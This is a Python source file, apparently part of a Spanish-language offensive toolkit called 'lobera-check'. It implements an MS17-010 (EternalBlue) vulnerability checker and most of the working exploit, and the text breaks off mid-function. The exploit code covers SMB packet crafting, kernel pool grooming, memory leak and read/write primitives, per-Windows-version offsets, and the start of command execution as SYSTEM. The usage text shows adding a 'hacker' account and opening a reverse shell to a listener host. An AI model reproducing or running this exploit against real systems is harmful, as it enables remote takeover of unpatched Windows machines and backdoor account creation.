#!/usr/bin/env python3
# tools/check/main.py
"""
lobera-check — Comprobación y explotación de vulnerabilidades conocidas en AD/Windows.

Vulnerabilidades soportadas:
  ms17010  — EternalBlue (CVE-2017-0144) — SMBv1 buffer overflow → RCE como SYSTEM

Modos:
  check    — Detecta si el objetivo es vulnerable sin lanzar nada
  exploit  — Explota la vulnerabilidad directamente con el kernel exploit real

Uso:
  lobera-check ms17010 check   -t 192.168.1.10
  lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd "net user hacker P@ss1234 /add"
  lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444
"""

import sys
import os
import struct
import socket
import random
import time

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.output import console


# ──────────────────────────────────────────────────────────────────────────────
# MYSMB — clase SMB personalizada, portada a Python 3
# Basada en helviojunior/MS17-010/mysmb.py
# ──────────────────────────────────────────────────────────────────────────────

def _build_mysmb_class():
    """Construye y devuelve la clase MYSMB (lazy import para no romper el módulo si no hay impacket)."""
    from impacket import smb as impacket_smb
    from struct import pack, unpack

    # Parchear getNTStatus en NewSMBPacket si no existe (misma técnica que mysmb.py original)
    if not hasattr(impacket_smb.NewSMBPacket, 'getNTStatus'):
        def _getNTStatus(self):
            return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
        setattr(impacket_smb.NewSMBPacket, 'getNTStatus', _getNTStatus)

    def _put_trans_data(transCmd, parameters, data, noPad=False):
        transCmd['Parameters']['ParameterOffset'] = 0
        transCmd['Parameters']['DataOffset'] = 0
        offset = 32 + 1 + len(transCmd['Parameters']) + 2
        transData = b''
        if len(parameters):
            padLen = 0 if noPad else (4 - offset % 4) % 4
            transCmd['Parameters']['ParameterOffset'] = offset + padLen
            transData = (b'\x00' * padLen) + parameters
            offset += padLen + len(parameters)
        if len(data):
            padLen = 0 if noPad else (4 - offset % 4) % 4
            transCmd['Parameters']['DataOffset'] = offset + padLen
            transData += (b'\x00' * padLen) + data
        transCmd['Data'] = transData

    # SMBNTTransactionSecondary_Parameters no existe en todas las versiones de impacket.
    # Se define aquí con la estructura del protocolo SMB (MS-CIFS §2.2.4.8.1),
    # heredando de SMBCommand_Parameters igual que el resto de clases de impacket.
    if not hasattr(impacket_smb, 'SMBNTTransactionSecondary_Parameters'):
        class _SMBNTTransactionSecondary_Parameters(impacket_smb.SMBCommand_Parameters):
            structure = (
                ('TotalParameterCount',  '<L=0'),
                ('TotalDataCount',       '<L=0'),
                ('ParameterCount',       '<L=0'),
                ('ParameterOffset',      '<L=0'),
                ('ParameterDisplacement','<L=0'),
                ('DataCount',            '<L=0'),
                ('DataOffset',           '<L=0'),
                ('DataDisplacement',     '<L=0'),
            )
        impacket_smb.SMBNTTransactionSecondary_Parameters = _SMBNTTransactionSecondary_Parameters

    class MYSMB(impacket_smb.SMB):
        def __init__(self, remote_host, remote_port=445, timeout=10):
            self._default_tid = 0
            self._pid = os.getpid() & 0xffff
            self._last_mid = random.randint(1000, 20000)
            self._pkt_flags2 = 0
            self._last_tid = 0
            self._last_fid = 0
            impacket_smb.SMB.__init__(self, remote_host, remote_host,
                                      sess_port=remote_port, timeout=timeout)

        def neg_session(self, extended_security=True, negPacket=None):
            impacket_smb.SMB.neg_session(self, extended_security=False, negPacket=negPacket)

        def next_mid(self):
            self._last_mid += random.randint(1, 20)
            return self._last_mid

        def set_default_tid(self, tid):
            self._default_tid = tid

        def get_default_tid(self):
            return self._default_tid

        def create_smb_packet(self, smbReq, mid=None, pid=None, tid=None):
            if mid is None:
                mid = self.next_mid()
            pkt = impacket_smb.NewSMBPacket()
            pkt.addCommand(smbReq)
            pkt['Tid'] = self._default_tid if tid is None else tid
            pkt['Uid'] = getattr(self, '_uid', 0)
            pkt['Pid'] = self._pid if pid is None else pid
            pkt['Mid'] = mid
            try:
                flags1, flags2 = self.get_flags()
            except Exception:
                flags1, flags2 = 0x18, 0x4001
            pkt['Flags1'] = flags1
            pkt['Flags2'] = self._pkt_flags2 if self._pkt_flags2 != 0 else flags2
            req = pkt.getData()
            return b'\x00\x00' + pack('>H', len(req)) + req

        def send_raw(self, data):
            self.get_socket().send(data)

        # ── TRANS ─────────────────────────────────────────────────────────────

        def create_trans_packet(self, setup, param=b'', data=b'', mid=None,
                                maxParameterCount=None, maxDataCount=None,
                                pid=None, tid=None, noPad=False,
                                totalParameterCount=None, totalDataCount=None):
            if maxParameterCount is None:
                maxParameterCount = len(param)
            if maxDataCount is None:
                maxDataCount = len(data)
            if totalParameterCount is None:
                totalParameterCount = len(param)
            if totalDataCount is None:
                totalDataCount = len(data)
            transCmd = impacket_smb.SMBCommand(impacket_smb.SMB.SMB_COM_TRANSACTION)
            transCmd['Parameters'] = impacket_smb.SMBTransaction_Parameters()
            transCmd['Parameters']['TotalParameterCount'] = totalParameterCount
            transCmd['Parameters']['TotalDataCount'] = totalDataCount
            transCmd['Parameters']['MaxParameterCount'] = maxParameterCount
            transCmd['Parameters']['MaxDataCount'] = maxDataCount
            transCmd['Parameters']['MaxSetupCount'] = len(setup) // 2
            transCmd['Parameters']['Flags'] = 0
            transCmd['Parameters']['Timeout'] = 0xffffffff
            transCmd['Parameters']['ParameterCount'] = len(param)
            transCmd['Parameters']['DataCount'] = len(data)
            transCmd['Parameters']['Setup'] = setup
            _put_trans_data(transCmd, param, data, noPad)
            return self.create_smb_packet(transCmd, mid, pid, tid)

        def send_trans(self, setup, param=b'', data=b'', mid=None,
                       maxParameterCount=None, maxDataCount=None,
                       pid=None, tid=None, noPad=False,
                       totalParameterCount=None, totalDataCount=None):
            self.send_raw(self.create_trans_packet(
                setup, param, data, mid, maxParameterCount, maxDataCount,
                pid, tid, noPad, totalParameterCount, totalDataCount))
            return self.recvSMB()

        def create_trans_secondary_packet(self, mid, param=b'', paramDisplacement=0,
                                          data=b'', dataDisplacement=0, pid=None, tid=None):
            transCmd = impacket_smb.SMBCommand(impacket_smb.SMB.SMB_COM_TRANSACTION_SECONDARY)
            transCmd['Parameters'] = impacket_smb.SMBTransactionSecondary_Parameters()
            transCmd['Parameters']['TotalParameterCount'] = len(param)
            transCmd['Parameters']['TotalDataCount'] = len(data)
            transCmd['Parameters']['ParameterCount'] = len(param)
            transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement
            transCmd['Parameters']['DataCount'] = len(data)
            transCmd['Parameters']['DataDisplacement'] = dataDisplacement
            _put_trans_data(transCmd, param, data)
            return self.create_smb_packet(transCmd, mid, pid, tid)

        def send_trans_secondary(self, mid, param=b'', paramDisplacement=0,
                                 data=b'', dataDisplacement=0, pid=None, tid=None):
            self.send_raw(self.create_trans_secondary_packet(
                mid, param, paramDisplacement, data, dataDisplacement, pid, tid))

        # ── NT TRANS ──────────────────────────────────────────────────────────

        def create_nt_trans_packet(self, func, setup=b'', param=b'', data=b'', mid=None,
                                   maxParameterCount=None, maxDataCount=None,
                                   pid=None, tid=None,
                                   totalParameterCount=None, totalDataCount=None):
            if maxParameterCount is None:
                maxParameterCount = len(param)
            if maxDataCount is None:
                maxDataCount = len(data)
            if totalParameterCount is None:
                totalParameterCount = len(param)
            if totalDataCount is None:
                totalDataCount = len(data)
            transCmd = impacket_smb.SMBCommand(impacket_smb.SMB.SMB_COM_NT_TRANSACT)
            transCmd['Parameters'] = impacket_smb.SMBNTTransaction_Parameters()
            transCmd['Parameters']['MaxSetupCount'] = 1
            transCmd['Parameters']['TotalParameterCount'] = totalParameterCount
            transCmd['Parameters']['TotalDataCount'] = totalDataCount
            transCmd['Parameters']['MaxParameterCount'] = maxParameterCount
            transCmd['Parameters']['MaxDataCount'] = maxDataCount
            transCmd['Parameters']['ParameterCount'] = len(param)
            transCmd['Parameters']['DataCount'] = len(data)
            transCmd['Parameters']['Function'] = func
            transCmd['Parameters']['Setup'] = setup
            _put_trans_data(transCmd, param, data)
            return self.create_smb_packet(transCmd, mid, pid, tid)

        def send_nt_trans(self, func, setup=b'', param=b'', data=b'', mid=None,
                          maxParameterCount=None, maxDataCount=None,
                          pid=None, tid=None,
                          totalParameterCount=None, totalDataCount=None):
            pkt = self.create_nt_trans_packet(func, setup, param, data, mid,
                                              maxParameterCount, maxDataCount,
                                              pid, tid, totalParameterCount, totalDataCount)
            self.send_raw(pkt)
            return self.recvSMB()

        def create_nt_trans_secondary_packet(self, mid, param=b'', paramDisplacement=0,
                                             data=b'', dataDisplacement=0, pid=None, tid=None):
            transCmd = impacket_smb.SMBCommand(impacket_smb.SMB.SMB_COM_NT_TRANSACT_SECONDARY)
            transCmd['Parameters'] = impacket_smb.SMBNTTransactionSecondary_Parameters()
            transCmd['Parameters']['TotalParameterCount'] = len(param)
            transCmd['Parameters']['TotalDataCount'] = len(data)
            transCmd['Parameters']['ParameterCount'] = len(param)
            transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement
            transCmd['Parameters']['DataCount'] = len(data)
            transCmd['Parameters']['DataDisplacement'] = dataDisplacement
            _put_trans_data(transCmd, param, data)
            return self.create_smb_packet(transCmd, mid, pid, tid)

        def send_nt_trans_secondary(self, mid, param=b'', paramDisplacement=0,
                                    data=b'', dataDisplacement=0, pid=None, tid=None):
            self.send_raw(self.create_nt_trans_secondary_packet(
                mid, param, paramDisplacement, data, dataDisplacement, pid, tid))

        def recv_transaction_data(self, mid, minLen):
            """
            Recibe datos de una transacción SMB, acumulando hasta tener minLen bytes.
            Filtra por MID para asegurar que es la respuesta correcta.
            Portado de helviojunior/MS17-010/mysmb.py.
            """
            from impacket import smb as _smb
            data = b''
            while len(data) < minLen:
                recvPkt = self.recvSMB()
                if recvPkt['Mid'] != mid:
                    continue
                resp = _smb.SMBCommand(recvPkt['Data'][0])
                fragment = resp['Data']
                if isinstance(fragment, (bytes, bytearray)):
                    data += fragment[1:]  # saltar byte de padding
                else:
                    try:
                        raw = fragment.getData() if hasattr(fragment, 'getData') else bytes(fragment)
                        data += raw[1:]
                    except Exception:
                        data += bytes(fragment)[1:]
            return data

        def nt_create_andx(self, tid, filename, desiredAccess=0x02000000,
                           fileAttributes=0x80, shareMode=0x7,
                           disposition=1, createOptions=0):
            # impacket ≥0.9.23: nt_create_andx(tid, filename, shareAccessMode, disposition, accessMask)
            fid = impacket_smb.SMB.nt_create_andx(self, tid, filename,
                                                    shareAccessMode=shareMode,
                                                    disposition=disposition,
                                                    accessMask=desiredAccess)
            self._last_fid = fid
            return fid

        def do_write_andx_raw_pipe(self, fid, data):
            if isinstance(data, str):
                data = data.encode()
            self.writeFile(self._default_tid, fid, data)

        def send_echo(self, data=b'a'):
            if isinstance(data, str):
                data = data.encode()
            echoCmd = impacket_smb.SMBCommand(impacket_smb.SMB.SMB_COM_ECHO)
            echoCmd['Parameters'] = impacket_smb.SMBEcho_Parameters()
            echoCmd['Parameters']['EchoCount'] = 1
            echoCmd['Data'] = impacket_smb.SMBEcho_Data()
            echoCmd['Data']['Data'] = data
            pkt = self.create_smb_packet(echoCmd)
            self.send_raw(pkt)
            return self.recvSMB()

        def get_smbconnection(self):
            from impacket.smbconnection import SMBConnection
            from impacket.smb import SMB_DIALECT
            conn = SMBConnection(self.get_remote_host(), self.get_remote_host(),
                                 sess_port=445, preferredDialect=SMB_DIALECT)
            conn.login('', '')
            return conn

        def get_dce_rpc(self, pipe_name):
            from impacket.dcerpc.v5 import transport
            rpctransport = transport.SMBTransport(
                self.get_remote_host(), self.get_remote_host(),
                filename='\\' + pipe_name,
                smb_connection=self.get_smbconnection()
            )
            return rpctransport.get_dce_rpc()

        def connect_tree(self, path, password=None,
                         service=impacket_smb.SERVICE_ANY, smb_packet=None):
            tid = impacket_smb.SMB.tree_connect_andx(self, path, password, service, smb_packet)
            self._last_tid = tid
            return tid

        def disconnect_tree(self, tid):
            impacket_smb.SMB.disconnect_tree(self, tid)

    return MYSMB


# ──────────────────────────────────────────────────────────────────────────────
# Checker MS17-010
# ──────────────────────────────────────────────────────────────────────────────

def check_ms17010(target, port=445, timeout=10):
    """
    Comprueba si el objetivo es vulnerable a MS17-010.
    Devuelve True (vulnerable), False (parcheado) o None (error de conexión).
    """
    try:
        MYSMB = _build_mysmb_class()
    except ImportError:
        console.print("  [red]Falta impacket — pip install impacket[/red]")
        return None

    from struct import pack

    TRANS_PEEK_NMPIPE = 0x23

    try:
        conn = MYSMB(target, int(port), timeout=timeout)
    except Exception:
        return None

    try:
        conn.login('', '')
    except Exception:
        pass

    try:
        tid = conn.connect_tree('\\\\' + target + '\\IPC$')
        conn.set_default_tid(tid)
    except Exception:
        try:
            conn.get_socket().close()
        except Exception:
            pass
        return None

    try:
        recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE),
                                  maxParameterCount=0xffff,
                                  maxDataCount=0x800)
        status = recvPkt.getNTStatus()
    except Exception as e:
        err = str(e).lower()
        if '0xc0000205' in err or 'insuff_server' in err:
            return True
        try:
            conn.get_socket().close()
        except Exception:
            pass
        return None

    try:
        conn.get_socket().close()
    except Exception:
        pass

    # STATUS_INSUFF_SERVER_RESOURCES = 0xC0000205 → vulnerable
    return status == 0xC0000205


# ──────────────────────────────────────────────────────────────────────────────
# EternalBlue — exploit completo portado a Python 3
# Basado en helviojunior/MS17-010/send_and_execute.py (sleepya)
# Soporta: Windows 7, 8, 10, 2008 R2, 2012, 2012 R2, 2016
# ──────────────────────────────────────────────────────────────────────────────

from struct import pack, unpack, unpack_from

# Información por versión de Windows y arquitectura
WIN7_64_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET': 0xa0,
    'SESSION_ISNULL_OFFSET': 0xba,
    'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
    'SECCTX_SIZE': 0x28,
}
WIN7_32_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET': 0x80,
    'SESSION_ISNULL_OFFSET': 0x96,
    'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
    'SECCTX_SIZE': 0x1c,
}
WIN8_64_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET': 0xb0,
    'SESSION_ISNULL_OFFSET': 0xca,
    'FAKE_SECCTX': pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
    'SECCTX_SIZE': 0x38,
}
WIN8_32_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET': 0x88,
    'SESSION_ISNULL_OFFSET': 0x9e,
    'FAKE_SECCTX': pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
    'SECCTX_SIZE': 0x24,
}
WIN2K3_64_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET': 0xba,
    'SESSION_SECCTX_OFFSET': 0xa0,
    'SECCTX_PCTXTHANDLE_OFFSET': 0x10,
    'PCTXTHANDLE_TOKEN_OFFSET': 0x40,
    'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
    'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}
WIN2K3_32_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET': 0x96,
    'SESSION_SECCTX_OFFSET': 0x80,
    'SECCTX_PCTXTHANDLE_OFFSET': 0xc,
    'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
    'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
    'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}
WINXP_32_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET': 0x94,
    'SESSION_SECCTX_OFFSET': 0x84,
    'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
    'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
    'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
    'TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1': 0x40,
    'TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1': 0x5c,
}

WIN7_32_TRANS_INFO = {
    'TRANS_SIZE': 0xa0, 'TRANS_FLINK_OFFSET': 0x18,
    'TRANS_INPARAM_OFFSET': 0x40, 'TRANS_OUTPARAM_OFFSET': 0x44,
    'TRANS_INDATA_OFFSET': 0x48, 'TRANS_OUTDATA_OFFSET': 0x4c,
    'TRANS_PARAMCNT_OFFSET': 0x58, 'TRANS_TOTALPARAMCNT_OFFSET': 0x5c,
    'TRANS_FUNCTION_OFFSET': 0x72, 'TRANS_MID_OFFSET': 0x80,
}
WIN7_64_TRANS_INFO = {
    'TRANS_SIZE': 0xf8, 'TRANS_FLINK_OFFSET': 0x28,
    'TRANS_INPARAM_OFFSET': 0x70, 'TRANS_OUTPARAM_OFFSET': 0x78,
    'TRANS_INDATA_OFFSET': 0x80, 'TRANS_OUTDATA_OFFSET': 0x88,
    'TRANS_PARAMCNT_OFFSET': 0x98, 'TRANS_TOTALPARAMCNT_OFFSET': 0x9c,
    'TRANS_FUNCTION_OFFSET': 0xb2, 'TRANS_MID_OFFSET': 0xc0,
}
WIN5_32_TRANS_INFO = {
    'TRANS_SIZE': 0x98, 'TRANS_FLINK_OFFSET': 0x18,
    'TRANS_INPARAM_OFFSET': 0x3c, 'TRANS_OUTPARAM_OFFSET': 0x40,
    'TRANS_INDATA_OFFSET': 0x44, 'TRANS_OUTDATA_OFFSET': 0x48,
    'TRANS_PARAMCNT_OFFSET': 0x54, 'TRANS_TOTALPARAMCNT_OFFSET': 0x58,
    'TRANS_FUNCTION_OFFSET': 0x6e, 'TRANS_PID_OFFSET': 0x78, 'TRANS_MID_OFFSET': 0x7c,
}
WIN5_64_TRANS_INFO = {
    'TRANS_SIZE': 0xe0, 'TRANS_FLINK_OFFSET': 0x28,
    'TRANS_INPARAM_OFFSET': 0x68, 'TRANS_OUTPARAM_OFFSET': 0x70,
    'TRANS_INDATA_OFFSET': 0x78, 'TRANS_OUTDATA_OFFSET': 0x80,
    'TRANS_PARAMCNT_OFFSET': 0x90, 'TRANS_TOTALPARAMCNT_OFFSET': 0x94,
    'TRANS_FUNCTION_OFFSET': 0xaa, 'TRANS_PID_OFFSET': 0xb4, 'TRANS_MID_OFFSET': 0xb8,
}
X86_INFO = {'ARCH': 'x86', 'PTR_SIZE': 4, 'PTR_FMT': 'I',
            'FRAG_TAG_OFFSET': 12, 'POOL_ALIGN': 8, 'SRV_BUFHDR_SIZE': 8}
X64_INFO = {'ARCH': 'x64', 'PTR_SIZE': 8, 'PTR_FMT': 'Q',
            'FRAG_TAG_OFFSET': 0x14, 'POOL_ALIGN': 0x10, 'SRV_BUFHDR_SIZE': 0x10}

def _merge(*dicts):
    r = {}
    for d in dicts:
        r.update(d)
    return r

OS_ARCH_INFO = {
    'WIN7': {
        'x86': _merge(X86_INFO, WIN7_32_TRANS_INFO, WIN7_32_SESSION_INFO),
        'x64': _merge(X64_INFO, WIN7_64_TRANS_INFO, WIN7_64_SESSION_INFO),
    },
    'WIN8': {
        'x86': _merge(X86_INFO, WIN7_32_TRANS_INFO, WIN8_32_SESSION_INFO),
        'x64': _merge(X64_INFO, WIN7_64_TRANS_INFO, WIN8_64_SESSION_INFO),
    },
    'WINXP': {
        'x86': _merge(X86_INFO, WIN5_32_TRANS_INFO, WINXP_32_SESSION_INFO),
        'x64': _merge(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
    },
    'WIN2K3': {
        'x86': _merge(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),
        'x64': _merge(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
    },
}

TRANS_NAME_LEN = 4
HEAP_HDR_SIZE = 8
GROOM_TRANS_SIZE = 0x5010

_special_mid = 0
_extra_last_mid = 0

def _reset_extra_mid(conn):
    global _extra_last_mid, _special_mid
    _special_mid = (conn.next_mid() & 0xff00) - 0x100
    _extra_last_mid = _special_mid

def _next_extra_mid():
    global _extra_last_mid
    _extra_last_mid += 1
    return _extra_last_mid

def _calc_alloc_size(size, align_size):
    return (size + align_size - 1) & ~(align_size - 1)

def _wait(conn):
    conn.send_echo(b'a')


def _find_named_pipe(conn):
    """Busca un named pipe accesible — prueba todos los comunes."""
    pipes = ['browser', 'spoolss', 'netlogon', 'lsarpc', 'samr']
    from impacket import smb as impacket_smb
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\IPC$')
    found = None
    for pipe in pipes:
        try:
            fid = conn.nt_create_andx(tid, pipe)
            conn.close(tid, fid)
            found = pipe
            break
        except impacket_smb.SessionError:
            pass
    conn.disconnect_tree(tid)
    return found


def _leak_frag_size(conn, tid, fid):
    """Detecta arquitectura y tamaño del pool Frag (solo Win Vista/2008+)."""
    info = {}
    mid = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid,
                                        data=b'A' * 0x10d0,
                                        maxParameterCount=GROOM_TRANS_SIZE - 0x10d0 - TRANS_NAME_LEN)
    req2 = conn.create_nt_trans_secondary_packet(mid, data=b'B' * 276)
    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:] + req2)
    leakData = conn.recv_transaction_data(mid, 0x10d0 + 276)
    leakData = leakData[0x10d4:]

    frag_bytes = b'Frag'
    if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET'] + 4] == frag_bytes:
        info['arch'] = 'x86'
        info['FRAG_POOL_SIZE'] = leakData[X86_INFO['FRAG_TAG_OFFSET'] - 2] * X86_INFO['POOL_ALIGN']
    elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET'] + 4] == frag_bytes:
        info['arch'] = 'x64'
        info['FRAG_POOL_SIZE'] = leakData[X64_INFO['FRAG_TAG_OFFSET'] - 2] * X64_INFO['POOL_ALIGN']
    else:
        raise Exception("No se encontró el pool tag Frag en el leak")

    return info


def _align_and_leak(conn, tid, fid, info, numFill=4):
    """Alinea el pool y filtra la dirección de la transacción (método matched_pairs)."""
    trans_param = pack('<HH', fid, 0)
    for _ in range(numFill):
        conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0,
                           maxParameterCount=GROOM_TRANS_SIZE - 0x10d0)

    mid_ntrename = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename,
                                        data=b'A' * 0x10d0,
                                        maxParameterCount=info['GROOM_DATA_SIZE'] - 0x10d0)
    req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data=b'B' * 276)
    req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid,
                                        totalDataCount=info['GROOM_DATA_SIZE'] - 0x1000,
                                        maxParameterCount=0x1000)
    reqs = b''
    for _ in range(12):
        mid = _next_extra_mid()
        reqs += conn.create_trans_packet(b'', mid=mid, param=trans_param,
                                          totalDataCount=info['BRIDE_DATA_SIZE'] - 0x200,
                                          totalParameterCount=0x200,
                                          maxDataCount=0, maxParameterCount=0)

    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:] + req2 + req3 + reqs)

    leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0 + 276)
    leakData = leakData[0x10d4:]

    frag_bytes = b'Frag'
    if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET'] + 4] != frag_bytes:
        return None

    leakData = leakData[info['FRAG_TAG_OFFSET'] - 4 + info['FRAG_POOL_SIZE']:]
    expected_size = pack('<H', info['BRIDE_TRANS_SIZE'])
    leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']
    if (leakData[0x4:0x8] != b'LStr' or
            leakData[info['POOL_ALIGN']:info['POOL_ALIGN'] + 2] != expected_size or
            leakData[leakTransOffset + 2:leakTransOffset + 4] != expected_size):
        return None

    leakTrans = leakData[leakTransOffset:]
    ptrf = info['PTR_FMT']
    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<' + ptrf * 5, leakTrans, 8)
    inparam_value = unpack_from('<' + ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
    leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]

    next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
    expected_flink = (next_page_addr + info['GROOM_POOL_SIZE'] +
                      info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] +
                      info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'])
    if expected_flink != flink_value:
        return None

    return {
        'connection': connection_addr,
        'session': session_addr,
        'next_page_addr': next_page_addr,
        'trans1_mid': leak_mid,
        'trans1_addr': inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN,
        'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],
    }


def _exploit_matched_pairs(conn, pipe_name, info):
    """Método matched pairs — Windows 7/2008R2 y posteriores (incluido 2012 R2)."""
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)

    info.update(_leak_frag_size(conn, tid, fid))
    info.update(OS_ARCH_INFO[info['os']][info['arch']])

    info['GROOM_POOL_SIZE'] = _calc_alloc_size(
        GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
    info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']
    bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
    info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
    info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']

    leakInfo = None
    for i in range(10):
        _reset_extra_mid(conn)
        leakInfo = _align_and_leak(conn, tid, fid, info)
        if leakInfo is not None:
            break
        conn.close(tid, fid)
        conn.disconnect_tree(tid)
        tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\IPC$')
        conn.set_default_tid(tid)
        fid = conn.nt_create_andx(tid, pipe_name)

    if leakInfo is None:
        return False

    info['fid'] = fid
    info.update(leakInfo)

    shift_indata_byte = 0x200
    conn.do_write_andx_raw_pipe(fid, b'A' * shift_indata_byte)

    indata_value = (info['next_page_addr'] + info['TRANS_SIZE'] + 8 +
                    info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte)
    indata_next_trans_displacement = info['trans2_addr'] - indata_value
    conn.send_nt_trans_secondary(mid=fid, data=b'\x00',
                                  dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
    _wait(conn)

    recvPkt = conn.send_nt_trans(5, mid=_special_mid, param=pack('<HH', fid, 0), data=b'')
    if recvPkt.getNTStatus() != 0x10002:
        return False

    fmt = info['PTR_FMT']
    conn.send_nt_trans_secondary(mid=fid,
                                  data=pack('<' + fmt, info['trans1_addr']),
                                  dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
    _wait(conn)

    conn.send_nt_trans_secondary(mid=_special_mid,
                                  data=pack('<' + fmt * 3,
                                            info['trans1_addr'],
                                            info['trans1_addr'] + 0x200,
                                            info['trans2_addr']),
                                  dataDisplacement=info['TRANS_INPARAM_OFFSET'])
    _wait(conn)

    info['trans2_mid'] = conn.next_mid()
    conn.send_nt_trans_secondary(mid=info['trans1_mid'],
                                  data=pack('<H', info['trans2_mid']),
                                  dataDisplacement=info['TRANS_MID_OFFSET'])
    return True


def _read_data(conn, info, read_addr, read_size):
    fmt = info['PTR_FMT']
    new_data = pack('<' + fmt * 3,
                    info['trans2_addr'] + info['TRANS_FLINK_OFFSET'],
                    info['trans2_addr'] + 0x200,
                    read_addr)
    new_data += pack('<II', 0, 0)
    new_data += pack('<III', 8, 8, 8)
    new_data += pack('<III', read_size, read_size, read_size)
    new_data += pack('<HH', 0, 5)
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data,
                                  dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])

    conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0),
                       totalDataCount=0x4300 - 0x20, totalParameterCount=0x1000)

    conn.send_nt_trans_secondary(mid=info['trans2_mid'])
    read_result = conn.recv_transaction_data(info['trans2_mid'], 8 + read_size)

    info['trans2_addr'] = unpack_from('<' + fmt, read_result)[0] - info['TRANS_FLINK_OFFSET']

    conn.send_nt_trans_secondary(mid=info['trans1_mid'],
                                  param=pack('<' + fmt, info['trans2_addr']),
                                  paramDisplacement=info['TRANS_INDATA_OFFSET'])
    _wait(conn)

    conn.send_nt_trans_secondary(mid=info['trans1_mid'],
                                  data=pack('<H', info['trans2_mid']),
                                  dataDisplacement=info['TRANS_MID_OFFSET'])
    _wait(conn)

    return read_result[8:]


def _write_data(conn, info, write_addr, write_data_bytes):
    fmt = info['PTR_FMT']
    conn.send_nt_trans_secondary(mid=info['trans1_mid'],
                                  data=pack('<' + fmt, write_addr),
                                  dataDisplacement=info['TRANS_INDATA_OFFSET'])
    _wait(conn)
    conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data_bytes)
    _wait(conn)


def _service_exec(conn, cmd):
    """Ejecuta un comando via SCM sobre la sesión SMB ya elevada a SYSTEM."""
    import string
    from impacket.dcerpc.v5 import transport, scmr

    svc_name = ''.join(random.choices(string.ascii_uppercase, k=6))
    rpc = conn.get_dce_rpc('svcctl')
    rpc.connect()
    rpc.bind(scmr.MSRPC_UUID_SCMR)

    sc_handle = None
    svc_handle = None
    try:
        resp = scmr.hROpenSCManagerW(rpc)
        sc_handle = resp['lpScHandle']

        try:
